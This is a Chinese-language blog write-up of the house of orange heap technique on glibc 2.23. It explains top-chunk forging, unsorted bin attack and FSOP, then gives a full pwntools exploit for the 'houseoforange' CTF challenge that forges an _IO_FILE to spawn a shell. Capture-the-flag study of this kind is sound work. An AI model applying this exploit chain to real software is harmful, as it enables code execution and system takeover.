<!DOCTYPE html>
<html lang="en">
<head><meta name="generator" content="Hexo 3.9.0">
  <meta charset="utf-8">
  
  
  
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>
    house_of_orange |
    
    The lair of C0yo7e</title>
  
    <link rel="shortcut icon" href="/images/time.png">
  
  <link rel="stylesheet" href="/css/style.css">
  
    <link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
  
  <script src="/js/pace.min.js"></script>
</head>
</html>
<body>
<main class="content">
  <section class="outer">
  

<article id="post-house-of-orange" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
  
  <div class="article-inner">
    
      <header class="article-header">
        
  
    <h1 class="article-title" itemprop="name">
      house_of_orange
    </h1>
  
  




      </header>
    

    
      <div class="article-meta">
        <a href="/2020/03/10/house-of-orange/" class="article-date">
  <time datetime="2020-03-10T03:44:04.000Z" itemprop="datePublished">2020-03-10</time>
</a>
        
      </div>
    

    
      
    <div class="tocbot"></div>





    

    <div class="article-entry" itemprop="articleBody">
      


      

      
        <p>其实之前从来没碰到house of orange的题，然后在想学io_file的时候看到有提到这个，就去了解了一下house of orange的原理。</p>
<h3 id="对于house-of-orange操作的理解（glibc2-23）"><a href="#对于house-of-orange操作的理解（glibc2-23）" class="headerlink" title="对于house of orange操作的理解（glibc2.23）"></a>对于house of orange操作的理解（glibc2.23）</h3><p>大体上是，没有<font color="red">free</font>函数，通过<font color="red">改写top chunk</font>，使top chunk的大小不能满足我们要malloc的大小，则malloc后，原来的top chunk会被释放，并置入到unsorted bin的队列。这样就可以到达不通过free也能把chunk写到unsorted bin的队列里面的目的了。</p>
<a id="more"></a>
<p>在<code>_int_malloc</code>函数中，会依次检验 fastbin、small bins、unsorted bin、large bins 是否可以满足分配要求，如果都不符合，接下来_int_malloc函数会试图使用 top chunk。</p>
<p>如果top chunk也无法满足的话，会执行以下的代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Otherwise, relay to handle system-dependent cases</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="keyword">void</span> *p = sysmalloc(nb, av);</span><br><span class="line">      <span class="keyword">if</span> (p != <span class="literal">NULL</span> &amp;&amp; __builtin_expect (perturb_byte, <span class="number">0</span>))</span><br><span class="line">        alloc_perturb (p, bytes);</span><br><span class="line">      <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>则需要执行 <code>sysmalloc</code>来向系统申请更多的空间。</p>
<p>但是对于堆来说有 mmap 和 brk 两种分配方式，我们需要让堆以 brk 的形式拓展（就是malloc的size要小于mmap的size），之后原有的 top chunk 会被置于 unsorted bin 中。</p>
<p>在 sysmalloc 函数中存在对 top chunk size 的 check，如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">assert((old_top == initial_top(av) &amp;&amp; old_size == <span class="number">0</span>) ||</span><br><span class="line">     ((<span class="keyword">unsigned</span> <span class="keyword">long</span>) (old_size) &gt;= MINSIZE &amp;&amp;</span><br><span class="line">      prev_inuse(old_top) &amp;&amp;</span><br><span class="line">      ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)old_end &amp; pagemask) == <span class="number">0</span>));</span><br></pre></td></tr></table></figure>

<p>这里是对top chunk 的合法性的检查。</p>
<p>想要伪造 ++top chunk++，就要满足以下几点：</p>
<blockquote>
<ul>
<li>伪造的 size 必须要对齐到内存页</li>
<li>size 要大于 MINSIZE(0x10)</li>
<li>size 要小于之后申请的 chunk size + MINSIZE(0x10)</li>
<li>size 的 prev inuse 位必须为 1</li>
</ul>
</blockquote>
<p><font color="red">fake_size 可以是 0x0fe1、0x1fe1、0x2fe1、0x3fe1 等对 4kb 对齐的 size。</font></p>
<p>这里用houseoforange这个题来操作一下吧</p>
<h3 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h3><p>这题没有free操作，让人很容易联想得到house_of_orange的操作，upgrade对写入的size没有检查，可以直接溢出。</p>
<p>它结合了house of orange、unsorted bin attack 和FSOP的知识点</p>
<blockquote>
<p><code>house of orange</code>使在没有free的条件下改写topchunk，下一次malloc一个大于topchunk的size则可以将它写进unsorted bin的队列了</p>
<p><code>unsorted bin attack</code>，通过malloc large bin（&gt;=512)，可以达到同时leak libc和heap的效果。随后再利用upgrade溢出，构造new chunk，在它的bk处存入_IO_list_all-0x10的地址（这个注意，unsorted bin attack的bk覆写一定是在之前并没有add的堆块，即被free掉的或者和这题的覆写一样的）</p>
<p><code>FSOP</code>，通过伪造_IO_list_all中的节点来实现对FILE链表的控制以实现利用目的。通常来说一般是直接利用任意写的漏洞修改_IO_list_all直接指向可控的地址。</p>
</blockquote>
<p>其中，unsorted bin attack和FSOP都是在最后一步malloc（0x10）的时候才实现的</p>
<h4 id="关于IO-FILE"><a href="#关于IO-FILE" class="headerlink" title="关于IO FILE"></a>关于IO FILE</h4><p>后面两步都会与一个叫<code>_IO_FILE_plus</code>的结构体有关系，那我们就先来看一下这个结构体吧</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">struct _IO_FILE_plus</span><br><span class="line">&#123;</span><br><span class="line">  _IO_FILE file;</span><br><span class="line">  const struct _IO_jump_t *vtable;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>而指向这个结构体的指针叫做<font color="red">_IO_list_all</font>，它存在于符号表内（即可以libc.sym[‘_IO_list_all’]操作），定义如下</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">extern struct _IO_FILE_plus *_IO_list_all;</span><br></pre></td></tr></table></figure>

<p>_IO_list_all一般指向的都是_IO_2_1_stderr<br>正常的程序中存在<code>stderr</code>、<code>sdout</code>以及<code>stdin</code>三个<code>IO FILE</code>，他们之间的关系呢大概是这样的</p>
<p><img src="/2020/03/10/house-of-orange/1.png" alt></p>
<p>就是</p>
<blockquote>
<p>_IO_list_all-&gt;_IO_2_1_stderr</p>
<p>_IO_2_1_stderr-&gt;_IO_2_1_stdout</p>
<p>_IO_2_1_stdout-&gt;_IO_2_1_stdin</p>
</blockquote>
<p>既然它牵扯到了IO FILE结构体里的东西，那我们就再倒回来说说这个结构体吧</p>
<p>_IO_FILE_plus结构体的第一part IO FILE的file结构（用gdb来看吧）</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p *((struct _IO_FILE_plus *) <span class="number">0x7f733765e540</span>)</span><br><span class="line">$<span class="number">2</span> = &#123;</span><br><span class="line">  file = &#123;</span><br><span class="line">    _flags = <span class="number">-72540026</span>, </span><br><span class="line">    _IO_read_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_read_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_ptr = <span class="number">0x0</span>, </span><br><span class="line">    _IO_write_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_buf_end = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_backup_base = <span class="number">0x0</span>, </span><br><span class="line">    _IO_save_end = <span class="number">0x0</span>, </span><br><span class="line">    _markers = <span class="number">0x0</span>, </span><br><span class="line">    _chain = <span class="number">0x7f733765e620</span> &lt;_IO_2_1_stdout_&gt;, </span><br><span class="line">    _fileno = <span class="number">2</span>, </span><br><span class="line">    _flags2 = <span class="number">0</span>, </span><br><span class="line">    _old_offset = <span class="number">-1</span>, </span><br><span class="line">    _cur_column = <span class="number">0</span>, </span><br><span class="line">    _vtable_offset = <span class="number">0</span> <span class="string">'\000'</span>, </span><br><span class="line">    _shortbuf = <span class="string">""</span>, </span><br><span class="line">    _lock = <span class="number">0x7f733765f770</span> &lt;_IO_stdfile_2_lock&gt;, </span><br><span class="line">    _offset = <span class="number">-1</span>, </span><br><span class="line">    _codecvt = <span class="number">0x0</span>, </span><br><span class="line">    _wide_data = <span class="number">0x7f733765d660</span> &lt;_IO_wide_data_2&gt;, </span><br><span class="line">    _freeres_list = <span class="number">0x0</span>, </span><br><span class="line">    _freeres_buf = <span class="number">0x0</span>, </span><br><span class="line">    __pad5 = <span class="number">0</span>, </span><br><span class="line">    _mode = <span class="number">0</span>, </span><br><span class="line">    _unused2 = <span class="string">'\000'</span> &lt;repeats <span class="number">19</span> times&gt;</span><br><span class="line">  &#125;, </span><br><span class="line">  vtable = <span class="number">0x7f733765c6e0</span> &lt;_IO_file_jumps&gt;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>chain指向的是下一个IO FILE结构体</p>
<p>而vtable呢是一个虚表指针，指向的是<code>_IO_file_jumps</code></p>
<p>刚好_IO_FILE_plus的第二part就是这个虚表了：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">IO_jump_t</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy);</span><br><span class="line">    JUMP_FIELD(<span class="keyword">size_t</span>, __dummy2);</span><br><span class="line">    JUMP_FIELD(_IO_finish_t, __finish);</span><br><span class="line">    JUMP_FIELD(_IO_overflow_t, __overflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __underflow);</span><br><span class="line">    JUMP_FIELD(_IO_underflow_t, __uflow);</span><br><span class="line">    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);</span><br><span class="line">    <span class="comment">/* showmany */</span></span><br><span class="line">    JUMP_FIELD(_IO_xsputn_t, __xsputn);</span><br><span class="line">    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);</span><br><span class="line">    JUMP_FIELD(_IO_seekoff_t, __seekoff);</span><br><span class="line">    JUMP_FIELD(_IO_seekpos_t, __seekpos);</span><br><span class="line">    JUMP_FIELD(_IO_setbuf_t, __setbuf);</span><br><span class="line">    JUMP_FIELD(_IO_sync_t, __sync);</span><br><span class="line">    JUMP_FIELD(_IO_doallocate_t, __doallocate);</span><br><span class="line">    JUMP_FIELD(_IO_read_t, __read);</span><br><span class="line">    JUMP_FIELD(_IO_write_t, __write);</span><br><span class="line">    JUMP_FIELD(_IO_seek_t, __seek);</span><br><span class="line">    JUMP_FIELD(_IO_close_t, __close);</span><br><span class="line">    JUMP_FIELD(_IO_stat_t, __stat);</span><br><span class="line">    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);</span><br><span class="line">    JUMP_FIELD(_IO_imbue_t, __imbue);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">if</span> 0</span></span><br><span class="line">    get_column;</span><br><span class="line">    set_column;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>在我们将IO_list_all链接进unsorted bin之后，unsortedbin的结构被破坏（IO_read_ptr=0,即size=0），再进行malloc就会触发malloc printerr报错</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (chunksize_nomask (victim) &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">           || __builtin_expect (chunksize_nomask (victim)</span><br><span class="line">                                &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">         malloc_printerr (<span class="string">"malloc(): memory corruption"</span>);</span><br></pre></td></tr></table></figure>

<p>触发之后</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">函数大致调用链</span><br><span class="line">mallloc_printerr-&gt; __libc_message—&gt;<span class="built_in">abort</span>-&gt;flush-&gt;_IO_flush_all_lock-&gt;_IO_OVERFLOW</span><br><span class="line">而_IO_OVERFLOW最后会调用vtable表中的__overflow 函数</span><br><span class="line"><span class="comment">//define _IO_OVERFLOW(FP, CH) JUMP1 (__overflow, FP, CH)</span></span><br></pre></td></tr></table></figure>

<p>_IO_flush_all_lockp源码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">_IO_flush_all_lockp (int do_lock)</span><br><span class="line">&#123;</span><br><span class="line">  int result = 0;</span><br><span class="line">  FILE *fp;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  _IO_cleanup_region_start_noarg (flush_cleanup);</span><br><span class="line">  _IO_lock_lock (list_all_lock);</span><br><span class="line">#endif</span><br><span class="line">  for (fp = (FILE *) _IO_list_all; fp != NULL; fp = fp-&gt;_chain)</span><br><span class="line">    &#123;</span><br><span class="line">      run_fp = fp;</span><br><span class="line">      if (do_lock)</span><br><span class="line">        _IO_flockfile (fp);</span><br><span class="line">      if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)/*一些检查，需要绕过*/</span><br><span class="line">           || (_IO_vtable_offset (fp) == 0</span><br><span class="line">               &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr</span><br><span class="line">                                    &gt; fp-&gt;_wide_data-&gt;_IO_write_base))/*也可以绕过这个*/</span><br><span class="line">           )</span><br><span class="line">          &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF)/*遍历_IO_list_all ，选出_IO_FILE作为_IO_OVERFLOW的参数，执行函数*/</span><br><span class="line">        result = EOF;</span><br><span class="line">      if (do_lock)</span><br><span class="line">        _IO_funlockfile (fp);</span><br><span class="line">      run_fp = NULL;</span><br><span class="line">    &#125;</span><br><span class="line">#ifdef _IO_MTSAFE_IO</span><br><span class="line">  _IO_lock_unlock (list_all_lock);</span><br><span class="line">  _IO_cleanup_region_end (0);</span><br><span class="line">#endif</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要想调用到IO_overflow,就要满足if的绕过条件，即：</p>
<blockquote>
<p>((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)</p>
<p>或者是</p>
<p>_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base)</p>
</blockquote>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">可以将write_base-&gt;0,write_ptr-&gt;0x1,满足write_base&lt;write_ptr</span><br><span class="line">也可以改_wide_data为原old_top-0x10就好了，fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base，在wide_data的io结构里，writer_base变成了之前的read_end,即我们构造的fd，writer_ptr变成了read_base,即我们构造的bk（io_list_all-0x10),只要满足前者的等式就好了</span><br></pre></td></tr></table></figure>

<p>第一种会相对来说方便一点</p>
<p>然后把vtable指向自己，再把system填入IO_OVERFLEW，执行的时候就可以getshell了</p>
<h4 id="exp："><a href="#exp：" class="headerlink" title="exp："></a>exp：</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./houseoforange'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./houseoforange'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span><span class="params">(size,name,price,color)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">	p.sendline(<span class="string">"1"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"name :"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Name :"</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">	p.sendline(str(price))</span><br><span class="line">	p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">	p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upgrade</span><span class="params">(size,name,price,color)</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">	p.sendline(<span class="string">"3"</span>)</span><br><span class="line">	p.recvuntil(<span class="string">"name :"</span>)</span><br><span class="line">	p.sendline(str(size))</span><br><span class="line">	p.recvuntil(<span class="string">"Name:"</span>)</span><br><span class="line">	p.send(name)</span><br><span class="line">	p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">	p.sendline(str(price))</span><br><span class="line">	p.recvuntil(<span class="string">"Orange:"</span>)</span><br><span class="line">	p.sendline(str(color))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">see</span><span class="params">()</span>:</span></span><br><span class="line">	p.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">	p.sendline(<span class="string">"2"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x10</span>,<span class="string">'aaaa'</span>,<span class="number">32</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">upgrade(<span class="number">0x40</span>,<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+<span class="string">'a'</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xfa1</span>),<span class="number">32</span>,<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0xfb0</span>,<span class="string">'aaaa'</span>,<span class="number">32</span>,<span class="number">1</span>) <span class="comment">#in unsorted bin list</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x400</span>,<span class="string">'b'</span>*<span class="number">8</span>,<span class="number">32</span>,<span class="number">1</span>)</span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">see()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">'b'</span>*<span class="number">8</span>)</span><br><span class="line">main_arena = u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>)) - <span class="number">1640</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> hex(main_arena)</span><br><span class="line">libc_base = main_arena - <span class="number">0x3c4b20</span></span><br><span class="line"><span class="keyword">print</span> hex(libc_base)</span><br><span class="line"></span><br><span class="line">upgrade(<span class="number">0x400</span>,<span class="string">'b'</span>*<span class="number">0x10</span>,<span class="number">32</span>,<span class="number">1</span>)</span><br><span class="line">see()</span><br><span class="line">p.recvuntil(<span class="string">'b'</span>*<span class="number">0x10</span>)</span><br><span class="line">heap_addr=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">'\x00'</span>))</span><br><span class="line"><span class="keyword">print</span> hex(heap_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">_IO_list_all = libc.symbols[<span class="string">'_IO_list_all'</span>] + libc_base</span><br><span class="line">system = libc.symbols[<span class="string">'system'</span>] + libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment">#满足_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line"><span class="comment"># pay = 'a'*0x400</span></span><br><span class="line"><span class="comment"># pay += p64(0) + p64(0x21) + 'a'*0x10</span></span><br><span class="line"><span class="comment"># io_file = '/bin/sh\x00' + p64(0x61) #'/bin/sh'是IO FILE，最后会作为IO_overflower的参数  victim-&gt;size=0</span></span><br><span class="line"><span class="comment"># io_file += p64(0) +p64(_IO_list_all-0x10) #unsorted bin attack  把list_all写进unsorted bin队列里面，即list_all-&gt;构造的堆块处(not io_stderr)</span></span><br><span class="line"><span class="comment"># io_file += p64(0) + p64(1) #绕检查_IO_write_base &lt; _IO_write_ptr</span></span><br><span class="line"><span class="comment"># io_file += p64(0) * 18</span></span><br><span class="line"><span class="comment"># io_file += p64(0) * 3</span></span><br><span class="line"><span class="comment"># io_file += p64(heap_addr+0x508) #vtable   -&gt;指向自己</span></span><br><span class="line"><span class="comment"># pay += io_file + p64(0)*2</span></span><br><span class="line"><span class="comment"># pay += p64(system)</span></span><br><span class="line"><span class="comment"># upgrade(0x800,pay,32,1)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 满足fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base</span></span><br><span class="line">payload=<span class="string">"x"</span>*<span class="number">0x400</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)+p32(<span class="number">666</span>)+p32(<span class="number">0xddaa</span>)+p64(<span class="number">0</span>)</span><br><span class="line">fake_chunk=<span class="string">'/bin/sh\x00'</span>+p64(<span class="number">0x61</span>)<span class="comment">#why ? io_file?</span></span><br><span class="line">fake_chunk+=p64(<span class="number">0</span>)+p64(_IO_list_all<span class="number">-0x10</span>)</span><br><span class="line">fake_chunk=fake_chunk.ljust(<span class="number">0xa0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk+=p64(heap_addr+<span class="number">0x420</span>) <span class="comment"># wide_data -&gt; read_end  然后就会调用虚表+0x18偏移处的函数了</span></span><br><span class="line">fake_chunk=fake_chunk.ljust(<span class="number">0xc0</span>,<span class="string">'\x00'</span>)</span><br><span class="line">fake_chunk+=p64(<span class="number">1</span>)</span><br><span class="line">payload+=fake_chunk</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(heap_addr+<span class="number">0x528</span>) </span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(<span class="number">2</span>)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># vtable</span></span><br><span class="line">payload += p64(system)</span><br><span class="line">upgrade(<span class="number">0x800</span>,payload,<span class="number">32</span>,<span class="number">2</span>)</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line"><span class="comment">#unsortbin.bk也被改写成了&amp;IO_list_all-0x10，所以此时的victim-&gt;size=0那么不会通过校验，进入malloc_printerr，触发异常。</span></span><br><span class="line">p.recvuntil(<span class="string">"Your choice : "</span>)</span><br><span class="line">p.sendline(<span class="string">"1"</span>) <span class="comment">#如果再分配一个chunk，就会触发malloc_printerr，会遍历IO_llist_all，最终调用 IO_overflow函数</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<h4 id="关于构造chunk的size为什么是0x60："><a href="#关于构造chunk的size为什么是0x60：" class="headerlink" title="关于构造chunk的size为什么是0x60："></a>关于构造chunk的size为什么是0x60：</h4><blockquote>
<p>首先victim-&gt;size=0（IO FILE的伪unsorted bin结构里，size=0）会触发malloc printer（就是那个malloc错误）这个时候就会去调用IO_list_all那个系列的函数</p>
<p>在IO_FILE结构体中，偏移0x60的字段是struct _IO_marker *_markers，偏移0x68的字段是struct _IO_FILE *_chain。而这两个的值恰恰是old_top的起始地址。</p>
</blockquote>
<p>　　原来改为0x60是为了将<code>old_top</code>加入<code>smallbin[4]</code>，而<code>smallbin[4]的fd和bk指针</code>恰好对应于<code>IO_FILE</code>结构体中的<code>_markers</code>和<code>_chain</code>字段。就能跳转至我们的<code>old_top</code>了</p>
<h4 id="实现FSOP的调试"><a href="#实现FSOP的调试" class="headerlink" title="实现FSOP的调试"></a>实现FSOP的调试</h4><p>在malloc最后一个堆块前我们去gdb里在<code>_int_malloc</code>看一下调用</p>
<p>出现error的字样时，chunk被写进<code>smallbin[4]</code></p>
<p><img src="/2020/03/10/house-of-orange/2.png" alt></p>
<p>此时的<code>IO_FILE</code>进入<code>main_arena</code></p>
<p><img src="/2020/03/10/house-of-orange/3.png" alt></p>
<p>此时chain的值为<code>fack_chunk</code>的地址，即<code>old_top</code></p>
<p><img src="/2020/03/10/house-of-orange/4.png" alt><br>(这里是第二种绕过方式的截图)</p>
<p>old_top里面chain为0，则往vtable执行</p>
